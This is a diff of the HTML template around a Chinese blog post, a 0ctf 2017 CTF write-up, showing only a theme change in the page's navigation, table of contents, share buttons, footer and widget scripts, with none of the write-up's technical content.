+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
-  </div>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
 
-      
 
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/02/27/ZCTF-2017-write-up/">
+                    ZCTF 2017 write up
+                </a>
+            </div>
+        
+    </nav>
 
-      <section class="site-overview sidebar-panel ">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/avatar/1.jpg"
-               alt="DazzleP" />
-          <p class="site-author-name" itemprop="name">DazzleP</p>
-          <p class="site-description motion-element" itemprop="description">A poor bin dog from ROIS@FZU</p>
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#char"><span class="toc-number">1.</span> <span class="toc-text">char</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#diethard"><span class="toc-number">2.</span> <span class="toc-text">diethard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-number">3.</span> <span class="toc-text">babyheap</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
         </div>
-        <nav class="site-state motion-element">
-          <div class="site-state-item site-state-posts">
-            <a href="/archives">
-              <span class="site-state-item-count">10</span>
-              <span class="site-state-item-name">日志</span>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"0ctf 2017 writeup　| DazzleP's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/02/27/ZCTF-2017-write-up/" title="下一篇: ZCTF 2017 write up">
+                <i class="fa fa-angle-right"></i>
             </a>
-          </div>
-
-          
-
-          
-            <div class="site-state-item site-state-tags">
-              
-                <span class="site-state-item-count">13</span>
-                <span class="site-state-item-name">标签</span>
-              
-            </div>
-          
-
-        </nav>
-
         
+    </div>
 
-        <div class="links-of-author motion-element">
-          
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/0ctf-2017-writeup/">0ctf 2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/ZCTF-2017-write-up/">ZCTF 2017 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/FSOP以及glibc针对其所做的防御措施/">FSOP以及glibc针对其所做的防御措施</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/HCTF-2016-writeup/">HCTF-2016-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/">HITCON CTF 2016 ShellingFolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/24/Simple-Core-Dump-analyser/">Simple Core Dump analyser</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/15/Producing-Overlapping-Chunks/">Producing Overlapping Chunks</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/HITCON-CTF-2016-SerectHolder/">HITCON CTF 2016 SerectHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/LCTF2016-PWN400/">LCTF2016 PWN400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/LCTF2016-PWN300/">LCTF2016 PWN300</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 DazzleP
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
         </div>
-
         
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              Links
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
             </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://blog.imspace.cn/" title="Space" target="_blank">Space</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://wdeil.xyz/" title="Wdeil" target="_blank">Wdeil</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://iamjimyes.github.io/" title="p5yGh0" target="_blank">p5yGh0</a>
-                </li>
-              
-            </ul>
-          </div>
         
-
-      </section>
-
-      
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-            
-              
-            
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#char"><span class="nav-text">char</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#diethard"><span class="nav-text">diethard</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap"><span class="nav-text">babyheap</span></a></li></ol></div>
-            
-          </div>
-        </section>
-      
-
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy; 
-  <span itemprop="copyrightYear">2017</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">DazzleP</span>
-</div>
-
-<div class="powered-by">
-  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
-</div>
-
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
-
-        
-
-        
-      </div>
-    </footer>
-
-    <div class="back-to-top">
-      <i class="fa fa-arrow-up"></i>
+</footer>
     </div>
-  </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
 
-  
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
 </script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-  
-  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
-
-
-
-  
-
-  
-    
-  
-
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"dazzlepppp"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
-
-  
-    
-      
-      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
-      <script src="/js/src/hook-duoshuo.js"></script>
-    
-  
-
-
-
-
-
-  
-  
-  
-
-  
-
-  
-
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
 </body>
 </html>
